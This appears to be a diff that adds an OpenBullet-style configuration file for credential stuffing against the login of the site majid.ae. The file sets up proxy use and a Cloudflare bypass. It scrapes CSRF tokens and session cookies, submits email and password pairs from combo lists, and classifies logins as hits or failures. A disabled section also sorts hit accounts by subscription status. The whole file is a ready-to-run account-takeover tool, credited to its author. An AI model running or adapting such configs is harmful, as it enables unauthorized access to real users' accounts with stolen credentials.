@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "majid",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-21T16:36:35.2726703+00:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://majid.ae/auth/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#token PARSE "<SOURCE>" LR "_token\" value=\"" "\"" -> VAR "token" 
+
+#XSRF-TOKEN PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" -> VAR "XSRF-TOKEN" 
+
+#majid_session PARSE "<COOKIES(majid_session)>" LR "" "" -> VAR "majid_session" 
+
+#ApplicationGatewayAffinityCORS PARSE "<COOKIES(ApplicationGatewayAffinityCORS)>" LR "" "" -> VAR "ApplicationGatewayAffinityCORS" 
+
+BYPASSCF "https://majid.ae/auth/login" 
+
+REQUEST POST "https://majid.ae/auth/login" 
+  CONTENT "_token=<token>&back_rel=https%3A%2F%2Fmajid.ae&email=<USER>&password=<PASS>&remember_me=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://majid.ae/auth/login" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 144" 
+  HEADER "Origin: https://majid.ae" 
+  HEADER "Alt-Used: majid.ae" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: XSRF-TOKEN=<XSRF-TOKEN>; majid_session=<majid_session>" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "البريد الألكتروني أو كلمة السر غير صحيحة" 
+    KEY "حدث خطأ في تسجيل الدخول" 
+  KEYCHAIN Success OR 
+    KEY "الرئيسية" 
+    KEY "أحدث الحلقات" 
+
+!BYPASSCF "https://majid.ae/auth/main-profile" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+
+!REQUEST GET "https://majid.ae/auth/main-profile" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
+!  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+!  HEADER "Accept-Language: en-US,en;q=0.5" 
+!  HEADER "Accept-Encoding: gzip, deflate, br" 
+!  HEADER "Referer: https://majid.ae/auth/select-profile" 
+!  HEADER "Alt-Used: majid.ae" 
+!  HEADER "Sec-Fetch-Dest: document" 
+!  HEADER "Sec-Fetch-Mode: navigate" 
+!  HEADER "Sec-Fetch-Site: same-origin" 
+!  HEADER "Sec-Fetch-User: ?1" 
+!  HEADER "Cache-Control: max-age=0" 
+!  HEADER "TE: trailers" 
+
+!KEYCHECK 
+!  KEYCHAIN Custom "FREE" OR 
+!    KEY "عير مشترك" 
+!  KEYCHAIN Success OR 
+!    KEY "<SOURCE>" DoesNotContain "غير مشترك" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config by" 
+
